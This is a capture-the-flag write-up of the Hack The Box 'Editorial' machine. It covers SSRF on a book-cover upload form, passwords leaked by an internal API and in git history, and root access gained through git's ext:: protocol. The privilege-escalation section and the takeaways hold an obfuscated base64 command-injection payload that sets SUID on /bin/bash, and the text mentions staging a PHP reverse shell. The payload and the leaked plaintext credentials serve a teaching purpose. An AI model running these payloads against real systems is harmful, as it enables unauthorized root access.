---
{"dg-publish":true,"permalink":"/ct-fs/htb/editorial/","dgShowFileTree":true,"dg-note-properties":{}}
---

# By 0xCapra_Daemon aka Will Keller

## Recon
![Pasted image 20260804151437.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804151437.png)


### Nmap:
```zsh
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.78.238 10.129.78.238
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-04 18:15 -0400
Nmap scan report for 10.129.78.238
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Initial scanning reveals ports open on 22 and 80 with a hostname for a webserver called `editorial.htb`. Adding to `/etc/hosts`
### Port 80
```zsh
──(kali㉿kali)-[~/CTF/HTB/editorial/scanning]
└─$ curl -v http://editorial.htb  
* Host editorial.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.78.238
*   Trying 10.129.78.238:80...
* Established connection to editorial.htb (10.129.78.238 port 80) from 10.10.14.192 port 45510 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: editorial.htb
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 04 Aug 2026 22:20:38 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 8577
< Connection: keep-alive
< 
<!DOCTYPE html>
<html lang="en">

    <!-- Basic -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">   

    <!-- Site Metas -->
    <title>Editorial Tiempo Arriba</title>  

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">

</head>
<body> 

    <!-- Header -->
    <header class="p-3 text-bg-dark">
    <div class="container">
      <div class="d-flex flex-wrap align-items-center justify-content-center justify-content-lg-start">
        <a href="/" class="d-flex align-items-center mb-2 mb-lg-0 text-white text-decoration-none">
          <svg class="bi me-2" width="40" height="32" role="img" aria-label="Bootstrap"><use xlink:href="#bootstrap"></use></svg>
        </a>

        <ul class="nav col-12 col-lg-auto me-lg-auto mb-2 justify-content-center mb-md-0">
          <li><a href="/" class="nav-link px-2 text-secondary">Home</a></li>
          <li><a href="/upload" class="nav-link px-2 text-white">Publish with us</a></li>
          <li><a href="/about" class="nav-link px-2 text-white">About</a></li>
        </ul>

        <form class="col-12 col-lg-auto mb-3 mb-lg-0 me-lg-3" role="search">
          <input type="search" class="form-control form-control-dark text-bg-dark" placeholder="Search..." aria-label="Search">
        </form>

      </div>
    </div>
  </header>

  <!-- Responsive -->
  <div class="container col-xxl-8 px-4 py-5">
    <div class="row flex-lg-row-reverse align-items-center g-5 py-5">
      <div class="col-10 col-sm-8 col-lg-6">
        <img style="border-radius: 10px;" src="/static/images/pexels-min-an-694740.jpg" class="d-block mx-lg-auto img-fluid" alt="Bootstrap Themes" loading="lazy" width="700" height="500">
      </div>
      <div class="col-lg-6">
        <h1 class="display-6 fw-bold lh-1 mb-3">Editorial Tiempo Arriba</h1>
        <br>
        <p class="lead">A year full of emotions, thoughts, and ideas. All on a simple white page.</p>
        <p class="lead">“I have always imagined that Paradise will be a kind of library.” - Jorge Luis Borges.</p>
      </div>
    </div>
  </div>

  <!-- Custom cards -->
  <div class="container px-4 py-5" id="custom-cards">
    <h2 class="pb-2 border-bottom">Top Rated Books</h2>

    <div class="row row-cols-1 row-cols-lg-3 align-items-stretch g-4 py-5">
      <div class="col">
        <div class="card card-cover h-100 overflow-hidden text-bg-dark rounded-4 shadow-lg" style="background-image: url('unsplash-photo-1.jpg');">
          <div class="d-flex flex-column h-100 p-5 pb-3 text-white text-shadow-1">
            <h3 class="pt-5 mt-5 mb-4 display-6 lh-1 fw-bold">🔍 The Analyst</h3>
            <ul class="d-flex list-unstyled mt-auto">
              <li class="me-auto">
                <img src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fprodimage.images-bn.com%2Fpimages%2F9780345455482_p0_v1_s1200x630.jpg&f=1&nofb=1&ipt=421e340b74e9077797821355c1b9aa95480b5dc478717b83e834414d610c2723&ipo=images" alt="Bootstrap" class="rounded-circle border border-white" width="32" height="32">
              </li>
              <li class="d-flex align-items-center me-3">
                <svg class="bi me-2" width="1em" height="1em"><use xlink:href="#geo-fill"></use></svg>
                <small>John Kat.</small>
              </li>
              <li class="d-flex align-items-center">
                <svg class="bi me-2" width="1em" height="1em"><use xlink:href="#calendar3"></use></svg>
                <small></small>
              </li>
            </ul>
          </div>
        </div>
      </div>

      <div class="col">
        <div class="card card-cover h-100 overflow-hidden text-bg-dark rounded-4 shadow-lg" style="background-image: url('unsplash-photo-2.jpg');">
          <div class="d-flex flex-column h-100 p-5 pb-3 text-white text-shadow-1">
            <h3 class="pt-5 mt-5 mb-4 display-6 lh-1 fw-bold">🩸 Misery.</h3>
            <ul class="d-flex list-unstyled mt-auto">
              <li class="me-auto">
                <img src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2F4.bp.blogspot.com%2F-hO_DsqEt214%2FToR01-Ame_I%2FAAAAAAAAAI4%2F-Uso8Uzxetw%2Fs1600%2FStephen_King_Misery_cover.jpg&f=1&nofb=1&ipt=058b4c99ba83221461bfe9c6f7e6e6c5d5d040dac469ea86b881fdeb804d75b7&ipo=images" alt="Bootstrap" class="rounded-circle border border-white" width="32" height="32">
              </li>
              <li class="d-flex align-items-center me-3">
                <svg class="bi me-2" width="1em" height="1em"><use xlink:href="#geo-fill"></use></svg>
                <small>Stephen K.</small>
              </li>
              <li class="d-flex align-items-center">
                <svg class="bi me-2" width="1em" height="1em"><use xlink:href="#calendar3"></use></svg>
                <small></small>
              </li>
            </ul>
          </div>
        </div>
      </div>

      <div class="col">
        <div class="card card-cover h-100 overflow-hidden text-bg-dark rounded-4 shadow-lg" style="background-image: url('unsplash-photo-3.jpg');">
          <div class="d-flex flex-column h-100 p-5 pb-3 text-shadow-1">
            <h3 class="pt-5 mt-5 mb-4 display-6 lh-1 fw-bold">👀 Ensayo sobre la ceguera</h3>
            <ul class="d-flex list-unstyled mt-auto">
              <li class="me-auto">
                <img src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2F1.bp.blogspot.com%2F-e2G635Csr2A%2FTtpOIDD3VwI%2FAAAAAAAAAw0%2FeGgQCgIq-AE%2Fs1600%2Fportada-ensayo-sobre-ceguera.jpg&f=1&nofb=1&ipt=82a89f68ebc361c4ab3002f3d40b0f7a478f27a98c19edc3280b94fb5f68343a&ipo=images" alt="Bootstrap" class="rounded-circle border border-white" width="32" height="32">
              </li>
              <li class="d-flex align-items-center me-3">
                <svg class="bi me-2" width="1em" height="1em"><use xlink:href="#geo-fill"></use></svg>
                <small>José Sara.</small>
              </li>
              <li class="d-flex align-items-center">
                <svg class="bi me-2" width="1em" height="1em"><use xlink:href="#calendar3"></use></svg>
                <small></small>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="container">
  <footer class="py-5">
    <div class="row">
      <div class="col-6 col-md-2 mb-3">
        <h5>Some</h5>
        <ul class="nav flex-column">
          <li class="nav-item mb-2"><a href="#" class="nav-link p-0 text-muted">Partner</a></li>
          <li class="nav-item mb-2"><a href="#" class="nav-link p-0 text-muted">Features</a></li>
        </ul>
      </div>

      <div class="col-6 col-md-2 mb-3">
        <h5>Books</h5>
        <ul class="nav flex-column">
          <li class="nav-item mb-2"><a href="#" class="nav-link p-0 text-muted">Carrers</a></li>
          <li class="nav-item mb-2"><a href="#" class="nav-link p-0 text-muted">History</a></li>
        </ul>
      </div>

      <div class="col-6 col-md-2 mb-3">
        <h5>Exists</h5>
        <ul class="nav flex-column">
          <li class="nav-item mb-2"><a href="#" class="nav-link p-0 text-muted">Address</a></li>
          <li class="nav-item mb-2"><a href="#" class="nav-link p-0 text-muted">Contact</a></li>
        </ul>
      </div>

      <div class="col-md-5 offset-md-1 mb-3">
        <form>
          <h5>Subscribe to our newsletter</h5>
          <p>Monthly digest of new books and exciting reviews.</p>
          <div class="d-flex flex-column flex-sm-row w-100 gap-2">
            <label for="newsletter1" class="visually-hidden">Email address</label>
            <input id="newsletter1" type="text" class="form-control" placeholder="Email address">
            <button class="btn btn-primary" type="button">Subscribe</button>
          </div>
        </form>
      </div>
    </div>

    <!-- Footer -->
    <div class="d-flex flex-column flex-sm-row justify-content-between py-4 my-4 border-top">
      <p>© 2023 Editorial Tiempo Arriba. All rights reserved.</p>
      <ul class="list-unstyled d-flex">
        <li class="ms-3"><a class="link-dark" href="#"><svg class="bi" width="24" height="24"><use xlink:href="#twitter"></use></svg></a></li>
        <li class="ms-3"><a class="link-dark" href="#"><svg class="bi" width="24" height="24"><use xlink:href="#instagram"></use></svg></a></li>
        <li class="ms-3"><a class="link-dark" href="#"><svg class="bi" width="24" height="24"><use xlink:href="#facebook"></use></svg></a></li>
      </ul>
    </div>
  </footer>
</div>

</body>
* Connection #0 to host editorial.htb:80 left intact
</html>
```
Initial `cURL` to this site suggests it's a book review blog.

![Pasted image 20260804152356.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804152356.png)
Visiting in the browser we see the main landing page, a tab for `Publish with Us` and `About`

![Pasted image 20260804152441.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804152441.png)
Clicking through to `Publish with Us` we see that we hit the endpoint `/upload`. This very much looks like our initial attack vector. Let's see if we can upload a shell, but first we will need to check out the code as much as we can to see if there are input filters in place. We'll also want to get `gobuster` going in case there are more subdirectories that prove interesting.
#### Gobuster

#### Caido
![Pasted image 20260804153905.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804153905.png)
Setting up the form data in the browser and then forwarding over to `Caido` we can see that it accepts our random submissions. However, it does not send the first two form fields `Cover URL` and `File`. 

![Pasted image 20260804155949.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804155949.png)
![Pasted image 20260804160030.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804160030.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/editorial/scanning]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.78.238 - - [04/Aug/2026 18:58:19] "GET /dog.jpeg HTTP/1.1" 200 -
```
Uploading our test image `dog.jpeg` and a test file called `test.txt` and hitting preview we capture a POST request to the `/upload-cover` endpoint in `Caido`. The server responds with a hashed version of our upload(s?) in `/static/uploads/d78f5844-09a7-4e9d-a9cc-04973fe0432f`

![Pasted image 20260804160251.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804160251.png)
When I attempted to visit it directly in the browser the server could not find it. This might just be a quickness issue.

![Pasted image 20260804160615.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804160615.png)
![Pasted image 20260804160406.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804160406.png)
![Pasted image 20260804160805.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804160805.png)
As I guessed, acting more quickly allowed us to hit the uploaded data (the cover image file pulled from our webserver) and it triggered a file download. This may be problematic if we are attempting to upload a reverse shell. However the preview function also rendered the image in the thumbnail spot, so we may be able to force the server to process our shellcode that way.


## Initial Access
### File Upload vulnerability
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/editorial/exploit]
└─$ ls
total 16K
4.0K drwxrwxr-x 2 kali kali 4.0K Aug  4 19:09 .
4.0K drwxrwxr-x 6 kali kali 4.0K Aug  4 17:57 ..
8.0K -rwxr-xr-x 1 kali kali 5.4K Aug  4 19:09 rev.php
```
![Pasted image 20260804161123.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804161123.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/editorial/exploit]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Armed with what we now from enumerating, I copy `/usr/share/webshells/php/php-reverse-shell.php` and rename it `rev.php` for ease of reference into my attacker machine's `/exploit` directory and I setup a simple HTTP server with python to host it for the cover URL upload request.

![Pasted image 20260804161459.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804161459.png)
We can successfully get the server to call back to our http server but it won't process the php with the preview button.

```zsh
        < script >
          document.getElementById('button-cover').addEventListener('click', function (e) {
            e.preventDefault();
            var formData = new FormData(document.getElementById('form-cover'));
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/upload-cover');
            xhr.onload = function () {
              if (xhr.status === 200) {
                var imgUrl = xhr.responseText;
                console.log(imgUrl);
                document.getElementById('bookcover').src = imgUrl;

                document.getElementById('bookfile').value = '';
                document.getElementById('bookurl').value = '';
              }
            };
            xhr.send(formData);
          }); <
        /script>
```
After several hours of not knowing what to do I used a hint and of course it's vulnerable to SSRF.

![Pasted image 20260804171642.png](/img/user/CTFs/HTB/Images/Editorial%20Images/Pasted%20image%2020260804171642.png)
I ran `caido` against every port number from 0-10000 and got the same response for every port except for `5001`. I'll grab the resulting "upload" to our machine to see what we can render from it.

```js
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
We get the output of what appears to be an api with a few interesting endpoints.

```zsh
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```
sending the same ssrf to the `/api/latest/metadata/messages/authors` endpoint we receive a message to new authors with a set of creds for a `dev` user. Let's try to log.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/editorial/files]
└─$ ssh dev@editorial.htb   
The authenticity of host 'editorial.htb (10.129.78.238)' can't be established.
ED25519 key fingerprint is: SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editorial.htb' (ED25519) to the list of known hosts.
dev@editorial.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Aug  5 12:26:33 AM UTC 2026

  System load:           0.0
  Usage of /:            61.6% of 6.35GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.78.238
  IPv6 address for eth0: dead:beef::a0de:adff:fe3b:4f4d


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ 

```
We successfully get a shell via ssh with the stolen creds.
## Privilege Escalation
```zsh
dev@editorial:~$ ls
total 36K
4.0K drwxr-x--- 4 dev  dev  4.0K Aug  5 02:19 .
4.0K drwxr-xr-x 4 root root 4.0K Jun  5  2024 ..
4.0K drwxrwxr-x 3 dev  dev  4.0K Jun  5  2024 apps
   0 lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
4.0K -rw-r--r-- 1 dev  dev  3.7K Jan  6  2022 .bashrc
4.0K drwx------ 2 dev  dev  4.0K Jun  5  2024 .cache
4.0K -rw------- 1 dev  dev    20 Aug  5 02:19 .lesshst
4.0K -rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
4.0K -rw-r----- 1 root dev    33 Aug  5 02:13 user.txt
dev@editorial:~$ ls apps
total 12K
4.0K drwxrwxr-x 3 dev dev 4.0K Jun  5  2024 .
4.0K drwxr-x--- 4 dev dev 4.0K Aug  5 02:19 ..
4.0K drwxr-xr-x 8 dev dev 4.0K Jun  5  2024 .git
```
Initial enumeration of our session shows `/apps` inside our user's home folder. In it, there's a `.git` repo. Let's see if we can enumerate it.

```zsh
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```
Checking out the commits we see one in particular `change(api): downgrading prod to dev`. Since our user is `dev`, `prod` may also be another user on this server.

```zsh
---snip---
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
Double checking `/etc/passwd` we can see that `prod` is indeed a user on this machine. Let's try and read out the commit history for the one we found earlier.

```zsh
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------

```
We copy/paste the git commit hash in the command `git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae`. In the logs we see where the message we found on the api earlier was originally for the `prod` user and was later changed to `dev`, and of course, a new set of creds.

```zsh
┌──(kali㉿kali)-[~/Desktop/ctf/htb/editorial]
└─$ ssh prod@editorial.htb
prod@editorial.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Aug  5 03:08:35 AM UTC 2026

  System load:           0.0
  Usage of /:            60.6% of 6.35GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.79.10
  IPv6 address for eth0: dead:beef::a0de:adff:fe62:de63


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


prod@editorial:~$ 
```
Successfully gained shell as `prod` on `editorial.htb` with the creds dumped from the commit logs.

```zsh
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```
Enumerating sudo privs for our user we see that they have permission to run a custom python script with a wildcard for the argument(s).

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
Reading out the script we see that it clones a given url into a git repo. 

```zsh
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py /root
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always /root new_changes
  stderr: 'fatal: repository '/root' does not exist
```
Running this targeting `/root` for the argument, we find that it's running `git clone -v -c protocol.ext.allow=always [arg] new_changes`. After doing some research I found a Snyk advisory for [CVE-2022-24066](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221) that tells us in affected versions of `simple git` whenever `git` is called with the option `-c protocol.ext.allow=always`, it will always trust the module `ext` which can be used to execute shell commands directly on the system. 

>[!example]
>`git clone -c protocol.ext.allow=always "ext::sh -c touch /tmp/pwned"`

The script we have sudo permission to execute happens to pass the vulnerable attribute when it calls `git` so we should be able to pass a shell command as the argument since it allowed a wildcard `*` for the argument in the sudo entry.

```zsh
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c echo$IFS"Y2htb2QgK3MgL2Jpbi9iYXNoCg=="|base64$IFS-d|sh'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c echo$IFS"Y2htb2QgK3MgL2Jpbi9iYXNoCg=="|base64$IFS-d|sh new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:~$ ls -lash /bin/bash
1.4M -rwsr-sr-x 1 root root 1.4M Mar 14  2024 ==/bin/bash==

```
After some faffing with the syntax we finally get an execution that works. successfully added SUID permissions to `/bin/bash` allowing us to call it as `root` with the `-p` flag.

```zsh
prod@editorial:~$ /bin/bash -p
bash-5.1# id; whoami
uid=1000(prod) gid=1000(prod) euid=0(root) egid=0(root) groups=0(root),1000(prod)
root
bash-5.1#
```
We successfully move to a root shell (effectively) with the new SUID version of `/bin/bash`. pwned.

## Final Thoughts
>[!Takeaways]
> - When you are able to get a call back to an attacker controlled server and upload vuln directly isn't working. Check for SSRF on all ports
> - When enumerating a git repo list the commits with `git log`. Copy the hash ID of the commit(s) you want to view and then show them with `git show [HASH]`
> - When a git function passes the unsafe setting `-c protocol.ext.allow=always` you can pass command execution to it via `git [some command] -c protocol.ext.allow=always (either called by you or in our case it was passed by the script) ext::sh -c [shell command]$IFS[shell command arg]`
> 	- i.e. `git clone -v -c protocol.ext.allow=always ext::sh -c echo$IFS"Y2htb2QgK3MgL2Jpbi9iYXNoCg=="|base64$IFS-d|sh new_changes`
> - Learn more git...

